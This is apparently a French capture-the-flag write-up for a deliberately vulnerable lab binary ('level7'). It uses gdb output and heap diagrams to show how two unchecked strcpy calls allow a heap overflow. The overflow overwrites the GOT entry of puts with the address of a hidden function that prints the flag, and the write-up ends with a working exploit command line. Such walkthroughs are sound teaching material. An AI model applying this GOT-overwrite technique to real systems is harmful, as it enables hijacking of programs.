<!-- vim: syntax=Markdown -->

On voit qu'avec 0 ou 1 argument, le programme crash.

On regarde donc ce qu'il se passe dans gdb et on peut voir qu'il y'a 2 strcpy, l'un copiant argv[1] et l'autre argv[2].
Aussi, on remarque que avec 2 arguments, le premier crash a 21 caracteres.

Le programme a aussi une fonction inutilisee `m` qui permet de print `c` qui est une variable globale.

On peut voir que la valeur de EAX est modifie.
Ici EAX est un pointeur vers argv[1] et argv[2].

```asm
0x080485a5 <+103>:   mov    eax,DWORD PTR [ebp+0xc]
0x0804858b <+106>:   add    eax,0x4
...
0x080485a5 <+132>:   mov    eax,DWORD PTR [ebp+0xc]
0x080485a8 <+135>:   add    eax,0x8
```

Le probleme etant que `c` est set apres les strcpy, on doit donc trouver un moyen de l'afficher apres le fgets.

Par chance, on a un put@plt, on peut donc comme dans l'exercice 5, modifier l'adresse de `puts` contenue dans le got a l'adresse `0x08049928` par l'adresse de `m` (`0x080484f4`).

---

Voici l'état de la mémoire pour nous aider à visualiser tout ça si on lance `./level7 hello world` :
- avant l'écriture de "hello"
```txt
            ┌─────────────┐                       ┌─────────────┐        
        ┌───┴──┐          ↓                   ┌───┴──┐          ↓        
000000010804a018   0000000000000000   000000020804a038   0000000000000000
└──────────────┘└╌┘└──────────────┘└╌┘└──────────────┘└╌┘└──────────────┘
    0804a008           0804a018           0804a028           0804a038    
```
- avant l'écriture de "world"
```txt
            ┌─────────────┐                       ┌─────────────┐        
        ┌───┴──┐          ↓ "hello"           ┌───┴──┐          ↓        
000000010804a018   6c6c65680000006f   000000020804a038   0000000000000000
└──────────────┘└╌┘└──────────────┘└╌┘└──────────────┘└╌┘└──────────────┘
    0804a008           0804a018           0804a028           0804a038    
```
- résultat final
```txt
            ┌─────────────┐                       ┌─────────────┐        
        ┌───┴──┐          ↓ "hello"           ┌───┴──┐          ↓ "world"
000000010804a018   6c6c65680000006f   000000020804a038   6c726f7700000064
└──────────────┘└╌┘└──────────────┘└╌┘└──────────────┘└╌┘└──────────────┘
    0804a008           0804a018           0804a028           0804a038    
```

---

On veut donc essayer d'écrire l'adresse de `m` dans `puts@got`, voici le résultat souhaité :
```txt
            ┌─────────────┐                       ┌──────────┐   
        ┌───┴──┐          ↓                   ┌───┴──┐       ↓   
000000010804a018   ################...########puts@got       m   
└──────────────┘└╌┘└──────────────┘└╌┘└──────────────┘└╌┘└──────┘
    0804a008           0804a018           0804a028       puts@got
```

On a donc un offset de 20 entre "hello" et le pointeur sur "world".\
`puts@got` se situe en `0x08049928`\
`m` se situe en `0x080484f4`

On a donc:
```bash
./level7 `printf '%020d\x28\x99\x04\x08'` `printf '\xf4\x84\x04\x08'`
```
